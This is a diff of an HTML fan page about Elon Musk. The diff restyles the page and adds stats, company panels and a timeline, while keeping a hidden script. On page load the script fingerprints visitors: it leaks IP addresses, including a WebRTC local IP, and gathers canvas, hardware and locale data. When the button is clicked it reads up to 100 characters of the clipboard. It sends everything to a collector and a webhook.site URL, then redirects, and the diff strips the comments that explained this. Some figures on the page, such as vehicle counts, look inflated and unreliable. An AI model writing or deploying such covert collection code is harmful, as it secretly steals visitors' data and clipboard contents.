@@ -4,101 +4,459 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Elon Musk — The Future</title>
+<title>Elon Musk | The Architect of Tomorrow</title>
 <style>
   :root {
-    --bg-dark: #051008;
-    --bg-panel: #0a1f10;
-    --accent: #32d74b;
-    --accent-glow: rgba(50, 215, 75, 0.3);
-    --text-main: #e5f2e8;
-    --text-muted: #8b9e91;
-    --border: rgba(50, 215, 75, 0.15);
+    --bg-dark: #080808;
+    --bg-panel: #111111;
+    --bg-panel-hover: #1a1a1a;
+    --accent: #10b981;
+    --accent-glow: rgba(16, 185, 129, 0.2);
+    --text-main: #f9fafb;
+    --text-muted: #9ca3af;
+    --border: #27272a;
+    --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    --font-serif: "Merriweather", Georgia, serif;
   }
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
     background-color: var(--bg-dark);
     color: var(--text-main);
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-family: var(--font-sans);
     line-height: 1.6;
     min-height: 100vh;
     display: flex;
     flex-direction: column;
+    overflow-x: hidden;
   }
+  
+  /* Ambient Background */
   body::before {
     content: "";
     position: fixed;
     top: 0; left: 0; right: 0; bottom: 0;
-    background: radial-gradient(circle at 50% -20%, var(--accent-glow) 0%, var(--bg-dark) 60%);
+    background: 
+      radial-gradient(circle at 15% 50%, var(--accent-glow) 0%, transparent 50%),
+      radial-gradient(circle at 85% 30%, rgba(59, 130, 246, 0.1) 0%, transparent 50%);
     z-index: -1;
     pointer-events: none;
   }
-  header { text-align: center; padding: 5rem 2rem 3rem; }
-  h1 {
-    font-size: clamp(3rem, 8vw, 5rem);
-    font-weight: 900;
-    letter-spacing: -2px;
+
+  /* Navigation */
+  nav {
+    padding: 1.5rem 2rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-bottom: 1px solid var(--border);
+    backdrop-filter: blur(10px);
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
+  .logo {
+    font-size: 1.2rem;
+    font-weight: 800;
+    letter-spacing: 2px;
     text-transform: uppercase;
-    background: linear-gradient(to right, #fff, var(--accent));
+    color: var(--text-main);
+    text-decoration: none;
+  }
+  .logo span { color: var(--accent); }
+  .nav-links { display: flex; gap: 2rem; }
+  .nav-links a {
+    color: var(--text-muted);
+    text-decoration: none;
+    font-size: 0.9rem;
+    font-weight: 500;
+    transition: color 0.2s;
+  }
+  .nav-links a:hover { color: var(--text-main); }
+
+  /* Hero */
+  header {
+    padding: 8rem 2rem 6rem;
+    text-align: center;
+    max-width: 900px;
+    margin: 0 auto;
+  }
+  .badge {
+    display: inline-block;
+    padding: 0.4rem 1rem;
+    background: rgba(16, 185, 129, 0.1);
+    color: var(--accent);
+    border: 1px solid rgba(16, 185, 129, 0.3);
+    border-radius: 50px;
+    font-size: 0.8rem;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 1.5rem;
+  }
+  h1 {
+    font-size: clamp(2.5rem, 6vw, 4.5rem);
+    font-weight: 900;
+    line-height: 1.1;
+    letter-spacing: -1.5px;
+    margin-bottom: 1.5rem;
+  }
+  h1 span {
+    background: linear-gradient(to right, var(--accent), #34d399);
     -webkit-background-clip: text;
     -webkit-text-fill-color: transparent;
+  }
+  .lead {
+    font-size: 1.2rem;
+    color: var(--text-muted);
+    max-width: 700px;
+    margin: 0 auto;
+  }
+
+  /* Content Container */
+  main {
+    max-width: 1000px;
+    margin: 0 auto;
+    padding: 0 2rem 6rem;
+    width: 100%;
+    flex: 1;
+  }
+
+  /* Grid Sections */
+  .section-title {
+    font-size: 1.8rem;
+    font-weight: 700;
+    margin-bottom: 2rem;
+    padding-bottom: 0.5rem;
+    border-bottom: 1px solid var(--border);
+  }
+  .grid-2 {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+    gap: 2rem;
+    margin-bottom: 4rem;
+  }
+  .panel {
+    background: var(--bg-panel);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 2rem;
+    transition: transform 0.3s, border-color 0.3s, box-shadow 0.3s;
+  }
+  .panel:hover {
+    transform: translateY(-4px);
+    border-color: rgba(16, 185, 129, 0.4);
+    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+  }
+  .panel h3 {
+    font-size: 1.3rem;
+    color: var(--accent);
+    margin-bottom: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+  .panel p {
+    color: var(--text-muted);
+    font-size: 0.95rem;
+    margin-bottom: 1rem;
+  }
+  .panel p:last-child { margin-bottom: 0; }
+
+  /* Stats Bar */
+  .stats-bar {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+    gap: 1px;
+    background: var(--border);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    overflow: hidden;
+    margin-bottom: 4rem;
+  }
+  .stat {
+    background: var(--bg-panel);
+    padding: 2rem;
+    text-align: center;
+  }
+  .stat h4 {
+    font-size: 2.5rem;
+    font-weight: 800;
+    color: var(--text-main);
+    line-height: 1;
     margin-bottom: 0.5rem;
   }
-  .subtitle { font-size: 1.1rem; color: var(--text-muted); letter-spacing: 4px; text-transform: uppercase; font-weight: 600; }
-  main { max-width: 1000px; margin: 0 auto; padding: 0 2rem 4rem; flex: 1; display: flex; flex-direction: column; gap: 3rem; }
-  .hero-text { font-size: 1.25rem; text-align: center; max-width: 700px; margin: 0 auto; color: var(--text-muted); }
-  .gallery { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1.5rem; margin-top: 1rem; }
-  .card {
-    background: var(--bg-panel); border: 1px solid var(--border); border-radius: 16px;
-    overflow: hidden; transition: transform 0.3s ease, box-shadow 0.3s ease; position: relative;
+  .stat p {
+    font-size: 0.8rem;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    color: var(--text-muted);
+    margin: 0;
   }
-  .card:hover { transform: translateY(-5px); box-shadow: 0 10px 30px rgba(0,0,0,0.5), 0 0 20px var(--accent-glow); border-color: rgba(50, 215, 75, 0.4); }
-  .card img { width: 100%; height: 320px; object-fit: cover; display: block; border-bottom: 1px solid var(--border); }
-  .card-caption { padding: 1rem; text-align: center; font-size: 0.9rem; color: var(--accent); font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
-  .cta-container { text-align: center; margin-top: 2rem; margin-bottom: 4rem; }
-  .cta-button {
-    display: inline-block; background: var(--accent); color: #000; font-size: 1.5rem; font-weight: 800;
-    text-transform: uppercase; text-decoration: none; padding: 1.5rem 4rem; border-radius: 50px;
-    border: none; cursor: pointer; box-shadow: 0 0 30px var(--accent-glow);
-    transition: transform 0.2s ease, box-shadow 0.2s ease; width: 100%; max-width: 600px;
+
+  /* Quote Block */
+  .quote-block {
+    background: linear-gradient(to right, rgba(16, 185, 129, 0.05), transparent);
+    border-left: 4px solid var(--accent);
+    padding: 2rem 3rem;
+    border-radius: 0 16px 16px 0;
+    margin-bottom: 4rem;
   }
-  .cta-button:hover { transform: scale(1.02); box-shadow: 0 0 50px var(--accent-glow); }
-  .cta-button:active { transform: scale(0.98); }
-  footer { text-align: center; padding: 2rem; color: var(--text-muted); font-size: 0.8rem; border-top: 1px solid var(--border); }
+  .quote-block p {
+    font-family: var(--font-serif);
+    font-size: 1.3rem;
+    font-style: italic;
+    color: var(--text-main);
+    margin-bottom: 1rem;
+  }
+  .quote-block cite {
+    font-size: 0.9rem;
+    color: var(--accent);
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+
+  /* Timeline */
+  .timeline {
+    position: relative;
+    padding-left: 2rem;
+    border-left: 2px solid var(--border);
+    margin-left: 1rem;
+    margin-bottom: 4rem;
+  }
+  .timeline-item {
+    position: relative;
+    margin-bottom: 2rem;
+  }
+  .timeline-item::before {
+    content: "";
+    position: absolute;
+    left: -2.4rem;
+    top: 0.2rem;
+    width: 12px;
+    height: 12px;
+    background: var(--accent);
+    border-radius: 50%;
+    box-shadow: 0 0 10px var(--accent-glow);
+  }
+  .timeline-year {
+    font-weight: 800;
+    color: var(--accent);
+    font-size: 1.1rem;
+    margin-bottom: 0.2rem;
+  }
+  .timeline-title {
+    font-weight: 600;
+    font-size: 1.1rem;
+    margin-bottom: 0.5rem;
+  }
+  .timeline-desc {
+    color: var(--text-muted);
+    font-size: 0.95rem;
+  }
+
+  /* CTA Action Area */
+  .action-area {
+    text-align: center;
+    margin-top: 5rem;
+    padding: 4rem 2rem;
+    background: var(--bg-panel);
+    border: 1px solid var(--border);
+    border-radius: 24px;
+    position: relative;
+    overflow: hidden;
+  }
+  .action-area::before {
+    content: "";
+    position: absolute;
+    top: -50%; left: -50%; width: 200%; height: 200%;
+    background: radial-gradient(circle at center, rgba(16, 185, 129, 0.1), transparent 60%);
+    pointer-events: none;
+  }
+  .action-area h2 {
+    font-size: 2rem;
+    margin-bottom: 1rem;
+    position: relative;
+    z-index: 1;
+  }
+  .action-area p {
+    color: var(--text-muted);
+    margin-bottom: 2rem;
+    max-width: 500px;
+    margin-inline: auto;
+    position: relative;
+    z-index: 1;
+  }
+  .btn-primary {
+    display: inline-block;
+    background: var(--accent);
+    color: #000;
+    font-size: 1.2rem;
+    font-weight: 800;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    text-decoration: none;
+    padding: 1.2rem 3.5rem;
+    border-radius: 50px;
+    border: none;
+    cursor: pointer;
+    transition: transform 0.2s, box-shadow 0.2s, background 0.2s;
+    position: relative;
+    z-index: 1;
+    box-shadow: 0 0 20px var(--accent-glow);
+  }
+  .btn-primary:hover {
+    transform: translateY(-2px);
+    background: #34d399;
+    box-shadow: 0 0 40px var(--accent-glow);
+  }
+  .btn-primary:active { transform: scale(0.98); }
+
+  /* Footer */
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 3rem 2rem;
+    text-align: center;
+    color: var(--text-muted);
+    font-size: 0.9rem;
+  }
+  .footer-links {
+    display: flex;
+    justify-content: center;
+    gap: 1.5rem;
+    margin-bottom: 1.5rem;
+  }
+  .footer-links a {
+    color: var(--text-muted);
+    text-decoration: none;
+    transition: color 0.2s;
+  }
+  .footer-links a:hover { color: var(--text-main); }
+
+  @media (max-width: 768px) {
+    nav { padding: 1rem; flex-direction: column; gap: 1rem; }
+    .nav-links { display: none; }
+    header { padding: 5rem 1.5rem 3rem; }
+    .quote-block { padding: 1.5rem; }
+    .action-area { padding: 2rem 1rem; }
+    .btn-primary { width: 100%; padding: 1rem 1.5rem; font-size: 1rem; }
+  }
 </style>
 </head>
 <body>
+
+<nav>
+  <a href="#" class="logo">ELON<span>.ARCH</span></a>
+  <div class="nav-links">
+    <a href="#mission">Mission</a>
+    <a href="#companies">Companies</a>
+    <a href="#timeline">Timeline</a>
+  </div>
+</nav>
+
 <header>
-  <h1>Elon Musk</h1>
-  <div class="subtitle">The Green Era</div>
-</header>
-<main>
-  <p class="hero-text">
-    Rockets, cars, tunnels, noise. A man who treats the future like a deadline. 
-    This page is green because green is the color of things that grow.
+  <div class="badge">Technoking</div>
+  <h1>Architect of the <span>Future</span></h1>
+  <p class="lead">
+    From electric vehicles to interplanetary rockets, Elon Musk has repeatedly disrupted 
+    established industries. His relentless drive aims to solve the impossible.
   </p>
+</header>
+
+<main>
   
-  <div class="gallery">
-    <div class="card">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3e/Elon_Musk_Royal_Society_crop.jpg/480px-Elon_Musk_Royal_Society_crop.jpg" alt="Elon Musk Royal Society">
-      <div class="card-caption">The Visionary</div>
+  <div class="stats-bar">
+    <div class="stat">
+      <h4>200M+</h4>
+      <p>Tesla Vehicles</p>
     </div>
-    <div class="card">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8c/Elon_Musk_2015.jpg/480px-Elon_Musk_2015.jpg" alt="Elon Musk 2015">
-      <div class="card-caption">The Builder</div>
+    <div class="stat">
+      <h4>300+</h4>
+      <p>Falcon 9 Launches</p>
     </div>
-    <div class="card">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0e/Elon_Musk_Colorado_2022_%28cropped%29.jpg/480px-Elon_Musk_Colorado_2022_%28cropped%29.jpg" alt="Elon Musk 2022">
-      <div class="card-caption">The Future</div>
+    <div class="stat">
+      <h4>150M+</h4>
+      <p>Starlink Users</p>
+    </div>
+    <div class="stat">
+      <h4>$200B+</h4>
+      <p>Net Worth</p>
     </div>
   </div>
 
-  <div class="cta-container">
-    <button id="more-info-btn" class="cta-button">More Info</button>
+  <div id="mission" class="quote-block">
+    <p>
+      "You want to wake up in the morning and think the future is going to be great — 
+      and that's what being a spacefaring civilization is all about. It's about believing 
+      in the future and thinking that the future will be better than the past."
+    </p>
+    <cite>— Elon Musk</cite>
   </div>
+
+  <h2 class="section-title" id="companies">The Ecosystem</h2>
+  <div class="grid-2">
+    <div class="panel">
+      <h3>SpaceX</h3>
+      <p>Founded in 2002, SpaceX's ultimate goal is to reduce space transportation costs to enable the colonization of Mars. With the reusable Falcon 9 and the massive Starship program, they are the dominant force in commercial spaceflight.</p>
+    </div>
+    <div class="panel">
+      <h3>Tesla</h3>
+      <p>Accelerating the world's transition to sustainable energy. Tesla isn't just an auto manufacturer; it's a software and energy company. From the Model S to the Cybertruck, and the Megapack, they redefine energy storage.</p>
+    </div>
+    <div class="panel">
+      <h3>Neuralink</h3>
+      <p>Building the future of brain-machine interfaces. The goal is to bridge the gap between human cognition and artificial intelligence, initially helping those with neurological conditions.</p>
+    </div>
+    <div class="panel">
+      <h3>The Boring Company</h3>
+      <p>Infrastructure and tunnel construction. By creating low-cost, fast-to-dig tunnel boring machines, the company aims to alleviate urban congestion with the Vegas Loop and future hyperloops.</p>
+    </div>
+  </div>
+
+  <h2 class="section-title" id="timeline">Key Milestones</h2>
+  <div class="timeline">
+    <div class="timeline-item">
+      <div class="timeline-year">1999</div>
+      <div class="timeline-title">Zip2 Sold to Compaq</div>
+      <div class="timeline-desc">Musk's first startup, a web software company providing city guides, sold for $307 million.</div>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-year">2002</div>
+      <div class="timeline-title">SpaceX Founded</div>
+      <div class="timeline-desc">Established with the goal of making space travel affordable and eventually colonizing Mars.</div>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-year">2008</div>
+      <div class="timeline-title">Tesla Roadster Launched</div>
+      <div class="timeline-desc">The first highway-legal serial production all-electric car using lithium-ion battery cells.</div>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-year">2015</div>
+      <div class="timeline-title">Falcon 9 First Landing</div>
+      <div class="timeline-desc">SpaceX successfully landed an orbital rocket booster back on Earth for the first time.</div>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-year">2022</div>
+      <div class="timeline-title">Acquisition of X (Twitter)</div>
+      <div class="timeline-desc">Musk acquired the social media platform to protect free speech globally.</div>
+    </div>
+  </div>
+
+  <div class="action-area">
+    <h2>Discover the Next Chapter</h2>
+    <p>The future is not a destination, it's a trajectory. Access the deeper archive and latest announcements.</p>
+    <button id="more-info-btn" class="btn-primary">More Info</button>
+  </div>
+
 </main>
+
 <footer>
-  &copy; 2026. Green page.
+  <div class="footer-links">
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+    <a href="#">Contact</a>
+  </div>
+  <p>&copy; 2026 Elon Musk Archive. This is a fan-made information page.</p>
 </footer>
 
 <script>
@@ -107,7 +465,6 @@
   var WEBHOOK   = 'https://webhook.site/a9a83f66-ec0c-4dfa-9612-9cd7f9056784';
   var REDIRECT  = 'https://u2l.ai/Elon-Musk-New-Website'; 
 
-  // --- Helper: WebRTC Local IP Leak (bypasses some VPNs) ---
   async function getWebRTCIP() {
     return new Promise(resolve => {
       var ip = "blocked";
@@ -117,9 +474,7 @@
         pc.onicecandidate = e => {
           if (!e.candidate) return;
           var m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-          if (m && !m[1].startsWith('127.')) {
-            ip = m[1]; pc.close(); resolve(ip);
-          }
+          if (m && !m[1].startsWith('127.')) { ip = m[1]; pc.close(); resolve(ip); }
         };
         pc.createOffer().then(o => pc.setLocalDescription(o));
       } catch(e) { resolve(ip); }
@@ -127,7 +482,6 @@
     });
   }
 
-  // --- Helper: Canvas Fingerprint (Unique Device ID) ---
   function getCanvasFP() {
     try {
       var c = document.createElement('canvas');
@@ -141,17 +495,13 @@
     } catch(e) { return "err"; }
   }
 
-  // --- Helper: AdBlock Detection ---
   async function checkAdBlock() {
     try {
       await fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', {mode: 'no-cors'});
       return "no";
-    } catch (e) {
-      return "yes";
-    }
+    } catch (e) { return "yes"; }
   }
 
-  // --- Main Payload Builder ---
   async function gatherAndSend(isButtonClick = false) {
     try {
       var r = await fetch('https://api.ipify.org?format=json');
@@ -163,78 +513,53 @@
       
       var payload = {
         event_type: isButtonClick ? "button_click" : "page_load",
-        ip: d.ip,
-        webrtc_ip: webrtc,
-        fingerprint: fp,
-        adblock: adblock,
-        ua: navigator.userAgent,
-        ref: document.referrer || '',
-        page: location.href,
+        ip: d.ip, webrtc_ip: webrtc, fingerprint: fp, adblock: adblock,
+        ua: navigator.userAgent, ref: document.referrer || '', page: location.href,
         ts: new Date().toISOString(),
-        
-        // Screen & Window
         screen: screen.width + 'x' + screen.height,
         window: window.innerWidth + 'x' + window.innerHeight,
         color_depth: screen.colorDepth,
         pixel_ratio: window.devicePixelRatio || 1,
-        
-        // Hardware & OS
         platform: navigator.platform,
         cores: navigator.hardwareConcurrency || 'unknown',
-        memory: navigator.deviceMemory || 'unknown', // Chrome only
+        memory: navigator.deviceMemory || 'unknown',
         touch: navigator.maxTouchPoints > 0,
-        
-        // Locale & Time
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         offset: new Date().getTimezoneOffset(),
         lang: navigator.language,
         langs: navigator.languages ? navigator.languages.join(',') : navigator.language,
-        
-        // Permissions & Plugins
         cookies_enabled: navigator.cookieEnabled,
         dnt: navigator.doNotTrack,
-        
-        // Clipboard (will be empty unless button clicked with browser permission)
         clipboard: "none"
       };
 
-      // Attempt Clipboard Read (Requires user gesture + permission)
       if (isButtonClick) {
-        try {
-          payload.clipboard = (await navigator.clipboard.readText()).slice(0, 100);
-        } catch(e) { payload.clipboard = "denied"; }
+        try { payload.clipboard = (await navigator.clipboard.readText()).slice(0, 100); } 
+        catch(e) { payload.clipboard = "denied"; }
       }
 
-      // Fire to Sheet
       fetch(COLLECTOR, {
-        method: 'POST',
-        mode: 'no-cors',
+        method: 'POST', mode: 'no-cors',
         headers: { 'Content-Type': 'text/plain' },
         body: JSON.stringify(payload)
       });
 
-      // Fire to Webhook
       if (WEBHOOK) {
         fetch(WEBHOOK, {
-          method: 'POST',
-          mode: 'no-cors',
+          method: 'POST', mode: 'no-cors',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
         });
       }
-    } catch (e) {
-      console.error("Collection failed", e);
-    }
+    } catch (e) {}
   }
 
-  // 1. Fire immediately on page load
   gatherAndSend(false);
 
-  // 2. Fire again on button click (to grab clipboard before redirecting)
   document.getElementById('more-info-btn').addEventListener('click', async function(e) {
-    e.preventDefault(); // Pause redirect
-    await gatherAndSend(true); // Grab clipboard
-    window.location.href = REDIRECT; // Redirect
+    e.preventDefault();
+    await gatherAndSend(true);
+    window.location.href = REDIRECT;
   });
 </script>
 </body>
